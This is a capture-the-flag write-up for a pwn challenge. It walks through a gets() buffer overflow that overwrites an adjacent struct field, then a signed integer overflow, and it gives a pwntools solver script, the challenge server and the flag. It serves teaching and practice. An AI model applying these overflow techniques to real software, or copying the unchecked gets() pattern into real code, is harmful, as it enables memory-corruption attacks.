# boroCTF 2026 — Jin Sakai (Pwn, 100pts)

**Author:** ForeverFlames  
**Category:** Pwn  

## Description

> The Eagle's curse has completely made him go mad... Once a hero of Tsushima, now a bloodthirsty warrior. Please put an end to this madness.

## Files

- `boss.c` — source code of the vulnerable binary
- `boss` — compiled ELF 64-bit binary
- `server.py` — UI wrapper that renders ASCII art and animations, passes I/O to `boss`
- Server: `nc w4owkcjzvv0e.boroctf.com 53217`

---

## Solution

### Step 1 — Understand the structure

The ZIP contains two components:

`server.py` is a Python wrapper that handles the Ghost of Tsushima-themed visual presentation — ASCII art, glitch animations, phase transitions. It launches `boss` as a subprocess and relays input/output between the player and the binary. The actual game logic and vulnerabilities are in `boss.c`.

### Step 2 — Analyze `boss.c`

The program has two phases.

**Phase 1 — Buffer overflow:**

```c
struct GameState {
    char buffer[32];
    int samurai_hp;
};

void fight_phase1() {
    struct GameState state;
    state.samurai_hp = 999;
    // ...
    gets(state.buffer);   // vulnerable: no bounds check
    
    if (state.samurai_hp <= 0) {
        printf("TRANSITION|\n");  // proceed to phase 2
    } else {
        printf("DIE|\n");
        exit(0);
    }
}
```

`gets()` reads input without checking length, allowing a buffer overflow. In the struct, `buffer[32]` is immediately followed by `samurai_hp` in memory. Writing 32 bytes of padding followed by `\xff\xff\xff\xff` overwrites `samurai_hp` with `-1` (signed), making the condition `samurai_hp <= 0` true and triggering the phase transition.

**Phase 2 — Integer overflow:**

```c
void fight_phase2() {
    int samurai_hp = INT_MAX;  // 2147483647
    // ...
    // choice=3, item=1, target=2:
    scanf("%d", &amount);
    samurai_hp += amount;
    
    if (samurai_hp == INT_MIN) {  // -2147483648
        // WIN — print flag
    }
}
```

`samurai_hp` starts at `INT_MAX` (2147483647). To win, `samurai_hp` must equal `INT_MIN` (-2147483648) after adding `amount`. Since `INT_MAX + 1 = INT_MIN` (signed integer overflow in C), we need `amount = 1`.

### Step 3 — Write the solver

```python
from pwn import *

conn = remote('w4owkcjzvv0e.boroctf.com', 53217)

# Phase 1 — buffer overflow: 32 bytes padding + \xff\xff\xff\xff overwrites samurai_hp with -1
conn.sendline(b'A'*32 + b'\xff\xff\xff\xff')

# Phase 2 — integer overflow: INT_MAX + 1 = INT_MIN
conn.sendline(b'3')  # Use Item
conn.sendline(b'1')  # Health Potion
conn.sendline(b'2')  # The Beast (pour on enemy)
conn.sendline(b'1')  # amount = 1

print(conn.recvall().decode())
```

### Step 4 — Run it

```bash
python3 solver.py
```

Output (after lengthy transition animation):

```
*** THE BEAST SHATTERS INTO DUST. YOU ARE VICTORIOUS! ***

boroCTF{gh0st_0f_3xpl01t4t10n}
```

The long output is the `transition()` animation in `server.py` — dozens of frames of ASCII art rendered before phase 2. The solver waits patiently through all of it.

---

## Flag

```
boroCTF{gh0st_0f_3xpl01t4t10n}
```

---

## Key takeaways

- **`gets()` is always vulnerable** — it reads until newline with no length limit, making buffer overflows trivial. It has been deprecated in C11 and should never be used
- **Struct memory layout matters** — fields are laid out sequentially in memory. `buffer[32]` is followed immediately by `samurai_hp`, so overflowing the buffer overwrites the adjacent integer
- **`\xff\xff\xff\xff` = -1 as signed int** — four bytes of 0xFF interpreted as a signed 32-bit integer equal -1, satisfying `samurai_hp <= 0`
- **INT_MAX + 1 = INT_MIN** — signed integer overflow wraps around in C silently. `2147483647 + 1 = -2147483648`
- In challenges with a UI wrapper (`server.py`) the actual vulnerability is always in the underlying binary (`boss`), not in the presentation layer
